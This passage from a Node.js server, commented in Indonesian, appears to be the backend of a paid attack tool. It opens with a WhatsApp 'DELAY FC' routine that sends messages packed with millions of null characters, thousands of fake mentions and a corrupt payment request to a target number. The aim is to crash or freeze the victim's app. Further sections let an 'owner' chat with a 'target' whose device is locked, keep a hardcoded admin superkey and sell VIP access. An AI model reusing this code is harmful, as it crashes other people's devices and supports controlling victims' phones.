            Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            conversation: String.fromCharCode(0).repeat(500000)
          }
        }
      }
    }, {});
    await sock.relayMessage(jid, badFlow.message, { messageId: badFlow.key.id });

    // Method 2: requestPayment dengan data corrupt
    await sock.relayMessage(jid, {
      requestPaymentMessage: {
        currencyCodeIso4217: String.fromCharCode(0).repeat(100000),
        amount1000: 999999999999,
        requestFrom: jid,
        noteMessage: {
          extendedTextMessage: {
            text: String.fromCharCode(0).repeat(2000000),
            contextInfo: {
              mentionedJid: Array.from({ length: 8000 }, () =>
                Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
              ),
              forwardingScore: 999999999
            }
          }
        },
        expiryTimestamp: 99999999999999,
        amount: { offset: 0, value: 999999999, currencyCode: "IDR" }
      }
    }, {});

    console.log("[DELAY FC] Sent to " + jid);
  } catch(e) {
    console.warn("[DELAY FC] Error:", e.message);
  }
}


// ── DEBUG: Lihat pairId semua user (akses dengan superkey) ───────────────────
app.get('/admin/listpairids', (req, res) => {
  const { superkey } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
  res.json(list);
});

// ── FORCE GENERATE pairId untuk 1 user (untuk troubleshoot) ──────────────────
app.get('/admin/genpairid', (req, res) => {
  const { superkey, username } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ error: 'User not found' });
  db[idx].pairId = genPairId();
  saveDatabase(db);
  console.log(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
  res.json({ username, pairId: db[idx].pairId });
});


// ════════════════════════════════════════════════════════════════════════════
// LOCK LIVE CHAT — komunikasi 2 arah owner ↔ target saat device di-lock
// ════════════════════════════════════════════════════════════════════════════
const lockChats = {}; // in-memory { deviceId: [{from, text, time}] }

// Owner kirim pesan ke target (via panel AX RRG)
app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'owner', text, time: new Date().toISOString().substring(11,16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  console.log(`[CHAT] ${from||'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

// Target ambil semua pesan (polling setiap 2 detik dari APK)
app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

// Panel ambil semua pesan (polling dari AX RRG)
app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

// Clear chat saat unlock
app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});

// ============================================================
// ===== VIP UPGRADE REQUEST SYSTEM ===========================
// ============================================================
//
// Alur:
// 1. User pilih durasi VIP di Flutter (1/3/7/31 hari / permanen)
// 2. User upload bukti transfer (gambar) → POST /requestVip
// 3. Request disimpan ke vipRequests.json dengan status "pending"
//    + bukti disimpan ke folder /proofs/<requestId>.<ext>
// 4. Owner lihat list request lewat GET /listVipRequests
// 5. Owner approve (POST /approveVip) atau reject (POST /rejectVip)
// 6. Pas approve:
//    - User role → "vip"
//    - expiredDate ditambah sesuai durasi (atau set jauh ke depan kalau permanen)
//    - Status request → "approved"
// 7. Flutter polling GET /myVipRequest buat tau status terbaru
//    - kalau approved → popup sukses premium
//    - kalau rejected → popup tolak premium
//
// ============================================================

const vipRequestsFile = path.join(__dirname, 'vipRequests.json');
const proofDir = path.join(__dirname, 'proofs');
if (!fs.existsSync(proofDir)) fs.mkdirSync(proofDir, { recursive: true });

function loadVipRequests() {
  try {
    if (!fs.existsSync(vipRequestsFile)) return [];
    return JSON.parse(fs.readFileSync(vipRequestsFile, 'utf8'));
  } catch (_) {
    return [];
  }
}
function saveVipRequests(data) {
  fs.writeFileSync(vipRequestsFile, JSON.stringify(data, null, 2));
}

// Daftar paket VIP yang tersedia. Harga dalam Rupiah.
// "days: 0" artinya permanen (diset 100 tahun ke depan).
const VIP_PACKAGES = [
  { id: '1d',     label: '1 Hari',     days: 1,     price: 5000   },
  { id: '3d',     label: '3 Hari',     days: 3,     price: 10000  },
  { id: '7d',     label: '7 Hari',     days: 7,     price: 15000  },
  { id: '31d',    label: '31 Hari',    days: 31,    price: 55000  },
  { id: 'forever',label: 'Permanen',   days: 0,     price: 100000 },
];

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
}

// POST /requestVip
// Body JSON: { key, packageId, proofBase64, proofMime }
// proofBase64 = data URL atau base64 mentah (image/jpeg, image/png, image/webp)
app.post('/requestVip', (req, res) => {
  const { key, packageId, proofBase64, proofMime } = req.body || {};

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: 'User not found' });

  const pkg = VIP_PACKAGES.find(p => p.id === packageId);
  if (!pkg) return res.status(400).json({ valid: false, message: 'Paket VIP tidak dikenal' });

  if (!proofBase64 || typeof proofBase64 !== 'string' || proofBase64.length < 100) {
    return res.status(400).json({ valid: false, message: 'Bukti transfer wajib diupload' });
  }

  // Cek apakah user masih punya request pending
  const requests = loadVipRequests();
  const pending = requests.find(r => r.username === user.username && r.status === 'pending');
  if (pending) {
    return res.json({
      valid: false,
      message: 'Kamu masih punya request VIP pending. Tunggu owner konfirmasi dulu.'
    });
  }

  // Parse base64 (support both "data:image/jpeg;base64,xxxx" dan "xxxx")
  let rawB64 = proofBase64;
  let mime = proofMime || 'image/jpeg';
  const m = proofBase64.match(/^data:([a-zA-Z0-9/+.-]+);base64,(.+)$/);
  if (m) {
    mime = m[1];
    rawB64 = m[2];
  }
  let ext = 'jpg';
  if (mime.includes('png')) ext = 'png';
  else if (mime.includes('webp')) ext = 'webp';

  const requestId = `${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
  const proofPath = path.join(proofDir, `${requestId}.${ext}`);

  try {
    fs.writeFileSync(proofPath, Buffer.from(rawB64, 'base64'));
  } catch (e) {
    return res.status(500).json({ valid: false, message: 'Gagal menyimpan bukti: ' + e.message });
  }

  const newRequest = {
    id: requestId,
    username: user.username,
    packageId: pkg.id,
    packageLabel: pkg.label,
    price: pkg.price,
    days: pkg.days,
    ip: getClientIp(req),
    proofFile: `proofs/${requestId}.${ext}`,
    status: 'pending',          // pending | approved | rejected
    createdAt: new Date().toISOString(),
    decidedAt: null,
    decidedBy: null,
    rejectReason: null,
  };

  requests.push(newRequest);
  saveVipRequests(requests);

  console.log(`[VIP] Request ${requestId} dari ${user.username} paket ${pkg.label} (Rp${pkg.price})`);
  return res.json({ valid: true, request: newRequest });
});

// GET /myVipRequest?key=...
// Return request terbaru user (apa pun status-nya). Kalau gak ada, return null.
app.get('/myVipRequest', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const requests = loadVipRequests();
  // Ambil request terbaru berdasarkan createdAt
  const mine = requests
    .filter(r => r.username === keyInfo.username)
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  if (mine.length === 0) return res.json({ valid: true, request: null });

  return res.json({
    valid: true,
    request: mine[0],
    packages: VIP_PACKAGES,
  });
});

// GET /listVipRequests?key=...&status=pending|approved|rejected|all
// Owner only. Default: pending.
app.get('/listVipRequests', (req, res) => {
  const { key, status } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can view VIP requests' });
  }

  let requests = loadVipRequests();
  const filterStatus = status || 'pending';
  if (filterStatus !== 'all') {
    requests = requests.filter(r => r.status === filterStatus);
  }
  // Urutkan terbaru dulu
  requests.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  return res.json({ valid: true, requests, packages: VIP_PACKAGES });
});

// GET /vipProof?key=...&id=...
// Owner only. Stream file bukti transfer.
app.get('/vipProof', (req, res) => {
  const { key, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner' });
  }

  const requests = loadVipRequests();
  const r = requests.find(x => x.id === id);
  if (!r) return res.status(404).json({ valid: false, message: 'Not found' });

  const fp = path.join(__dirname, r.proofFile);
  if (!fs.existsSync(fp)) return res.status(404).json({ valid: false, message: 'Proof file missing' });

  // Prevent path traversal
  const safePath = path.resolve(fp);
  if (!safePath.startsWith(path.join(__dirname, 'proofs'))) {
    return res.status(400).json({ valid: false, message: 'Invalid path' });
  }

  return res.sendFile(safePath);
});

// POST /approveVip  Body: { key, requestId }
// Owner only. Set user role → vip, extend expiredDate.
app.post('/approveVip', (req, res) => {
  const { key, requestId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can approve' });
  }

  const requests = loadVipRequests();
  const idx = requests.findIndex(r => r.id === requestId);
  if (idx === -1) return res.status(404).json({ valid: false, message: 'Request not found' });

  const r = requests[idx];
  if (r.status !== 'pending') {
    return res.json({ valid: false, message: `Request sudah ${r.status}` });
  }

  const user = db.find(u => u.username === r.username);
  if (!user) return res.status(404).json({ valid: false, message: 'User not found' });

  // Hitung expiredDate baru
  let newExpired;
  if (r.days === 0) {
    // Permanen — set 100 tahun ke depan
    newExpired = new Date();
    newExpired.setFullYear(newExpired.getFullYear() + 100);
  } else {
    // Extend dari tanggal hari ini (bukan dari expiredDate lama, biar gak ketumpuk)
    // Kalau expiredDate lama masih di masa depan, extend dari situ.
    const baseDate = user.expiredDate && !isExpired(user)
      ? new Date(user.expiredDate)
      : new Date();
    baseDate.setDate(baseDate.getDate() + r.days);
    newExpired = baseDate;
  }
  user.expiredDate = newExpired.toISOString().split('T')[0];
  user.role = 'vip';

  saveDatabase(db);

  // Update request
  r.status = 'approved';
  r.decidedAt = new Date().toISOString();
  r.decidedBy = owner.username;
  requests[idx] = r;
  saveVipRequests(requests);

  console.log(`[VIP] ✅ ${owner.username} APPROVED ${r.username} → VIP (${r.packageLabel})`);
  fs.appendFileSync('logUser.txt', `${owner.username} ApprovedVip ${r.username} ${r.packageLabel}\n`);

  return res.json({ valid: true, request: r, user: { username: user.username, role: user.role, expiredDate: user.expiredDate } });
});

// POST /rejectVip  Body: { key, requestId, reason }
// Owner only.
app.post('/rejectVip', (req, res) => {
  const { key, requestId, reason } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') {
    return res.status(403).json({ valid: false, message: 'Only owner can reject' });
  }

  const requests = loadVipRequests();
  const idx = requests.findIndex(r => r.id === requestId);
  if (idx === -1) return res.status(404).json({ valid: false, message: 'Request not found' });

  const r = requests[idx];
  if (r.status !== 'pending') {
    return res.json({ valid: false, message: `Request sudah ${r.status}` });
  }

  r.status = 'rejected';
  r.decidedAt = new Date().toISOString();
  r.decidedBy = owner.username;
  r.rejectReason = (typeof reason === 'string' && reason.trim().length > 0) ? reason.trim() : 'Pembayaran tidak valid';
  requests[idx] = r;
  saveVipRequests(requests);

  console.log(`[VIP] ❌ ${owner.username} REJECTED ${r.username} (${r.packageLabel}) — ${r.rejectReason}`);
  fs.appendFileSync('logUser.txt', `${owner.username} RejectedVip ${r.username} ${r.packageLabel}\n`);

  return res.json({ valid: true, request: r });
});

// Alias prefix /api/vip/* biar konsisten sama style lain
app.post('/api/vip/request', (req, res) => { req.url = '/requestVip'; app.handle(req, res); });
app.get ('/api/vip/my',      (req, res) => { req.url = '/myVipRequest?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get ('/api/vip/list',    (req, res) => { req.url = '/listVipRequests?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get ('/api/vip/proof',   (req, res) => { req.url = '/vipProof?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/vip/approve', (req, res) => { req.url = '/approveVip'; app.handle(req, res); });
app.post('/api/vip/reject',  (req, res) => { req.url = '/rejectVip'; app.handle(req, res); });